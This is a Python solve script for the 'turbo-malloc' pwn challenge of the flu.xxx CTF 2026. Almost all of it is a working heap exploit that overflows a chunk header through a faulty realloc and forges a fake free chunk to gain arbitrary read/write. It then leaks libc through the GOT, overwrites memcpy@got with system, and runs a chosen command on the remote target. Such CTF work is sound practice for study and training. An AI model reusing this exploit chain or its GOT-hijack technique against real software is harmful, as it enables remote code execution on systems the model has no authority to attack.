#!/usr/bin/env python3
"""turbo-malloc -- flu.xxx CTF 2026, pwn (73 pts).

Chain: turbo_realloc() copies the OLD chunk size into a smaller new chunk, so a
shrink overflows the neighbour header.  A fake free chunk (size 0x1000000) makes
the allocator hand out a block that ends 16 bytes before notes[], which turns
one note into an arbitrary read/write window on notes[]/note_sizes[].  Leak
read@libc, overwrite memcpy@got with system, park "<cmd>\\0" in a freed chunk and
let turbo_realloc() call system() for us.

usage:
  python3 solve.py <host> <port> [--tls] [--libc public/libc.so.6] [--cmd /readflag]
  python3 solve.py --local          # smoke test via docker (fake flag, no TLS)
"""
import argparse
import os
import re
import socket
import ssl
import struct
import subprocess
import sys
import time

MEM = 0x4040C0          # static 1 MiB heap
NOTES = 0x5040E0        # notes[16]
GOT_READ = 0x404038     # read@got   (read@libc lives here)
GOT_MEMCPY = 0x404048   # memcpy@got (hijack target: only call with attacker rdi)
MAGIC = 0xF45735        # chunk->next magic for an in-use chunk
CMD_SIZE = 0x100        # size of the chunk that will hold the command string


def q(x):
    return struct.pack("<Q", x)


def u64(b):
    return struct.unpack("<Q", b[:8])[0]


class Tube:
    """Minimal send/recvuntil/recvn over a socket (plain or TLS) or a pipe."""

    def __init__(self, sock=None, proc=None):
        self.sock = sock
        self.proc = proc
        self.buf = b""

    def send(self, data):
        if isinstance(data, str):
            data = data.encode()
        if self.sock is not None:
            self.sock.sendall(data)
        else:
            self.proc.stdin.write(data)
            self.proc.stdin.flush()

    def _fill(self):
        if self.sock is not None:
            data = self.sock.recv(0x1000)
        else:
            data = self.proc.stdout.read1(0x1000)
        if not data:
            raise EOFError("target closed the connection")
        self.buf += data

    def recvuntil(self, delim):
        while delim not in self.buf:
            self._fill()
        end = self.buf.index(delim) + len(delim)
        out, self.buf = self.buf[:end], self.buf[end:]
        return out

    def recvn(self, n):
        while len(self.buf) < n:
            self._fill()
        out, self.buf = self.buf[:n], self.buf[n:]
        return out

    def recvall(self, timeout=5.0):
        """Read whatever arrives until EOF or `timeout` seconds of silence."""
        out = self.buf
        self.buf = b""
        if self.sock is not None:
            self.sock.settimeout(timeout)
            try:
                while True:
                    data = self.sock.recv(0x1000)
                    if not data:
                        break
                    out += data
            except (socket.timeout, ssl.SSLError, OSError):
                pass
        else:
            fd = self.proc.stdout.fileno()
            deadline = time.time() + timeout
            while time.time() < deadline:
                if not select_ready(fd, deadline - time.time()):
                    break
                data = os.read(fd, 0x1000)
                if not data:
                    break
                out += data
        return out


def select_ready(fd, timeout):
    import select
    return bool(select.select([fd], [], [], max(timeout, 0))[0])


def menu(t):
    t.recvuntil(b"> ")


def create(t, slot, size):
    t.send(b"1\n")
    t.recvuntil(b"Slot (0-15): ")
    t.send(f"{slot}\n".encode())
    t.recvuntil(b"Size: ")
    t.send(f"{size}\n".encode())
    t.recvuntil(b"Successfully created new note!\n")


def delete(t, slot):
    t.send(b"2\n")
    t.recvuntil(b"Slot (0-15): ")
    t.send(f"{slot}\n".encode())
    t.recvuntil(b"Successfully deleted note!\n")


def read_note(t, slot, size):
    t.send(b"3\n")
    t.recvuntil(b"Slot (0-15): ")
    t.send(f"{slot}\n".encode())
    data = t.recvn(size)
    return data


def write_note(t, slot, data):
    t.send(b"4\n")
    t.recvuntil(b"Slot (0-15): ")
    t.send(f"{slot}\n".encode())
    t.recvuntil(b"Data: ")
    t.send(data)


def expand(t, slot, size):
    t.send(b"5\n")
    t.recvuntil(b"Slot (0-15): ")
    t.send(f"{slot}\n".encode())
    t.recvuntil(b"New size: ")
    t.send(f"{size}\n".encode())
    t.recvuntil(b"Successfully expanded note!\n")


def master_payload(values, sizes, size):
    """One 0x200-byte write through the master note: notes[16] || note_sizes[16]."""
    blob = b"".join(q(v) for v in values) + b"".join(q(s) for s in sizes)
    assert len(blob) <= size
    return blob + b"B" * (size - len(blob))


def elf_symbol_offsets(path, names):
    """{name: st_value} for the wanted .dynsym entries of an ELF file."""
    with open(path, "rb") as f:
        d = f.read()
    shoff, = struct.unpack_from("<Q", d, 0x28)
    shentsize, shnum, shstrndx = struct.unpack_from("<HHH", d, 0x3A)
    secs = [struct.unpack_from("<IIQQQQIIQQ", d, shoff + i * shentsize) for i in range(shnum)]
    shstr = secs[shstrndx][4]

    def cstr(base, off):
        end = d.index(b"\0", base + off)
        return d[base + off:end].decode()

    by_name = {cstr(shstr, s[0]): s for s in secs}
    symtab, strtab = by_name[".dynsym"], by_name[".dynstr"]
    found = {}
    for i in range(symtab[5] // 24):
        name, _info, _other, _shndx, value, _size = struct.unpack_from("<IBBHQQ", d, symtab[4] + i * 24)
        if name and cstr(strtab[4], name) in names:
            found[cstr(strtab[4], name)] = value
    return found


def exploit(t, offsets, cmd):
    for slot in range(4):                       # chunks at 0x4040c0/1d0/2e0/3f0
        create(t, slot, 0x100)

    delete(t, 2)                                # free chunk at 0x4042e0
    payload = bytearray(b"A" * 0x100)
    payload[0x20:0x28] = q(0)                   # fake next
    payload[0x28:0x30] = q(0x1000000)           # fake size
    write_note(t, 0, bytes(payload))
    expand(t, 0, 0x20)                          # 0x100-byte copy hits the 0x404310 header

    create(t, 2, 0xFFDB0)                       # splits the fake chunk at 0x5040d0
    create(t, 4, 0x200)                         # slot 4 == &notes[0]

    values, sizes = [0] * 16, [0] * 16
    values[4], sizes[4] = NOTES, 0x200          # keep the master note alive
    write_note(t, 4, master_payload(values, sizes, 0x200))

    values[0], sizes[0] = GOT_READ, 0x40        # notes[0] -> read@got
    write_note(t, 4, master_payload(values, sizes, 0x200))
    leak = read_note(t, 0, 0x40)
    read_addr = u64(leak)
    libc = read_addr - offsets["read"]
    assert libc & 0xFFF == 0, f"bad leak {read_addr:#x}"
    print(f"[*] read@libc = {read_addr:#x}  libc = {libc:#x}")

    values[0], sizes[0] = GOT_MEMCPY, 8         # memcpy@got -> system
    write_note(t, 4, master_payload(values, sizes, 0x200))
    write_note(t, 0, q(libc + offsets["system"]))

    create(t, 1, CMD_SIZE)                      # data at 0x4040d0
    write_note(t, 1, cmd.encode() + b"\0")
    delete(t, 1)                                # header rewritten, bytes survive

    print(f"[*] triggering system({cmd!r})")
    expand(t, 0, CMD_SIZE)                      # turbo_realloc -> memcpy -> system(cmd)


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?")
    ap.add_argument("port", nargs="?", type=int)
    ap.add_argument("--tls", action="store_true", help="wrap the connection in TLS")
    ap.add_argument("--libc", default="public/libc.so.6", help="libc shipped with the challenge")
    ap.add_argument("--cmd", default="/readflag")
    ap.add_argument("--local", action="store_true", help="run the handout binary in docker")
    args = ap.parse_args()

    if args.local:
        image = "ubuntu:24.04"
        args.libc = "/tmp/libc_local.so"      # the container's libc, not the handout one
        if not os.path.exists(args.libc):
            print(f"[*] extracting {image} libc to {args.libc}")
            subprocess.run(["docker", "run", "--rm", "--platform", "linux/amd64", image,
                            "cat", "/lib/x86_64-linux-gnu/libc.so.6"],
                           stdout=open(args.libc, "wb"), check=True)
        cmdline = ("printf 'flag{local_test}\\n' > /flag.txt; exec ./turbo-malloc")
        args.cmd = "cat /flag.txt"
        proc = subprocess.Popen(
            ["docker", "run", "--rm", "-i", "--platform", "linux/amd64", "--network", "none",
             "-v", os.path.abspath("public") + ":/w", "-w", "/w", image, "sh", "-c", cmdline],
            stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.DEVNULL)
        t = Tube(proc=proc)
    else:
        if args.host is None or args.port is None:
            ap.error("HOST and PORT are required unless --local is used")
        sock = socket.create_connection((args.host, args.port), timeout=20)
        if args.tls:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            sock = ctx.wrap_socket(sock, server_hostname=args.host)
        sock.settimeout(20)
        t = Tube(sock=sock)

    offsets = elf_symbol_offsets(args.libc, {"read", "system"})
    print(f"[*] libc offsets: read={offsets['read']:#x} system={offsets['system']:#x}")

    menu(t)                                     # banner ends with "> "
    exploit(t, offsets, args.cmd)

    out = t.recvall(10.0)
    sys.stdout.buffer.write(out)
    sys.stdout.flush()
    match = re.search(rb"flag\{[^}]*\}", out)
    print("\n[+] FLAG:", match.group(0).decode() if match else "not found")


if __name__ == "__main__":
    main()
